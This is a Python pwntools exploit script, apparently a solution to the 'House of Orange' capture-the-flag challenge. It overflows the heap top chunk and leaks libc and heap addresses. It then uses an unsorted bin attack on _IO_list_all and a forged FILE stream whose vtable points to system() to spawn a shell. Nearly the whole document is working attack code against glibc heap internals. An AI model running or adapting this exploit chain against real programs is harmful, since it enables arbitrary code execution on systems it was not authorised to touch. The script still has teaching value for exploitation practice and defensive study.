from pwn import *


#http://tacxingxing.com/2018/01/10/house-of-orange/
libc=ELF("libc.so.6_375198810bb39e6593a968fcbcf6556789026743")
#libc=ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
r=process('./houseoforange_22785bece84189e632567da38e4be0e0c4bb1682',env={"LD_PRELOAD": "./libc.so.6_375198810bb39e6593a968fcbcf6556789026743"})
#r=process('./houseoforange_22785bece84189e632567da38e4be0e0c4bb1682')
pause()

def build(size,payload,price,color):
    r.sendline("1")
    r.recvuntil("name :")
    r.sendline(str(size))
    r.recvuntil(" :")
    r.send(payload)
    r.recvuntil(":")
    r.sendline(str(price))
    r.recvuntil(":")
    r.sendline(str(color))
    r.recvuntil(" : ")
    
def upgrade(size,payload,price,color):
    r.sendline("3")
    r.recvuntil("name :")
    r.sendline(str(size))
    r.recvuntil(":")
    r.send(payload)
    r.recvuntil(":")
    r.sendline(str(price))
    r.recvuntil(":")
    r.sendline(str(color))
    r.recvuntil(" : ")


r.recvuntil(" : ")

build(0x80,"AAAAAAAA",1000,1)

payload="Q"*168+p64(0xf31)
upgrade(len(payload),payload,2000,2)
pause()
log.info("Malloc large chunk to trigger sysmalloc from mmap")
build(0x10000,"ZZZZZZZZ",1,1)
pause()
log.info("leaking")
log.info("build a 0x400 for leaking libc and heap ptr, due to large chunk features")
build(0x500,"BBBBBBBB",1,1)
sleep(0.1)
r.sendline("2")
r.recvuntil("BBBBBBBB")
leak=r.recvuntil("\n")
libc_leak= u64(leak[:-1].ljust(8,"\x00")) 
log.info("libc leak  : "+hex(libc_leak))

upgrade(0x500,"B"*16,2000,2)
r.sendline("2")
r.recvuntil("B"*16)
leak=r.recvuntil("\n")
heap=u64(leak[:-1].ljust(8,"\x00"))-0x130

malloc = libc_leak -(0x7f5180292188-0x7f51802b0f00)

libc_base= malloc- (0x7f1b214a5f00 - 0x7f1b210c3000)
io_list_all = libc_base + libc.symbols['_IO_list_all'] 
log.info("io_list_all : "+hex(io_list_all))

log.info("heap : "+hex(heap))
log.info("malloc : "+hex(malloc))
log.info("libc base : "+hex(libc_base))
log.info("_IO_list_all : "+hex(io_list_all))
log.info("malloc_hook : "+hex(libc_base+libc.symbols['__malloc_hook']))
log.info("system : "+hex(libc_base+libc.symbols['system']))
log.info("start fsop")
#old region
payload="X"*0x500

#overflow region
payload+=p64(0x0)+p64(0x21) # works for 0x0 ,0x21
payload+="Q"*16 #garbage

fs  = "/bin/sh\x00"+ p64(0x61) #fake file stream
fs += p64(0)+p64(io_list_all-0x10) #do unsorted bin attack  fd bk pointer
fs += p64(0)+p64(1)
fs  = fs.ljust(0xc0,"\x00")
fs +=p64(0)

payload+=fs
payload+= p64(0)*2
payload+= p64(heap+0x740) # pointing to the vtable
payload+= p64(0)*3 #vtable for error
payload+=p64(libc_base+libc.symbols['system'])
upgrade(0x900,payload,2000,2)
log.info("After this pause will get shell")
pause()
r.sendline("1")
r.sendline("ls -al")
r.interactive()
